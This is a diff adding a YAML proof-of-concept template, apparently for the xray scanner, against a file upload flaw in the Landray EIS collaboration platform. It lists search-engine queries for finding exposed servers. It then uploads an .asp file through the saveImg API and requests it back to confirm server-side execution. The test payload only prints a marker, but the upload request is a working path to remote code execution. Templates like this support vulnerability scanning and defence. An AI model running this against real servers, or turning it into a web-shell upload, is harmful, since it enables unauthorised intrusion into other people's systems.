@@ -1,0 +1,57 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: body="/Global/Pages/CheckPage/IKey.aspx"
+    hunter-query: web.body="/Global/Pages/CheckPage/IKey.aspx"
+    quake-query: body:"/Global/Pages/CheckPage/IKey.aspx"
+    zoomeye-query: app:"蓝凌EIS智慧协同平台"
+    threatbook-query: # 不在跟进
+    cve: 
+    cnvd:
+    tips: 
+    
+name: poc-yaml-landray-eis-saveImg-upload
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomInt(10000,99999)
+  s2: randomLowercase(8)
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /eis/service/api.aspx?action=saveImg
+      follow_redirects: false
+      headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0eRg1ccWLR6yWQ5L  
+      body: |
+        ------WebKitFormBoundary0eRg1ccWLR6yWQ5L
+        Content-Disposition: form-data; name="file"; filename="y0q4nhqnki.asp"
+        Content-Type: text/html
+        
+        <% response.write("test")%>
+        ------WebKitFormBoundary0eRg1ccWLR6yWQ5L
+    expression: >-
+      response.status == 200 && response.body_string.contains("/files/editor_img/")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+/\\w+.asp)".bsubmatch(response.body)
+      filename: search["filename"]
+
+  r1:
+    request:
+      method: GET
+      path: /files/editor_img/{{filename}}
+      follow_redirects: false 
+    expression: >-
+      response.status == 200 && response.body_string.contains("test")
+
+expression: r0()  && r1()
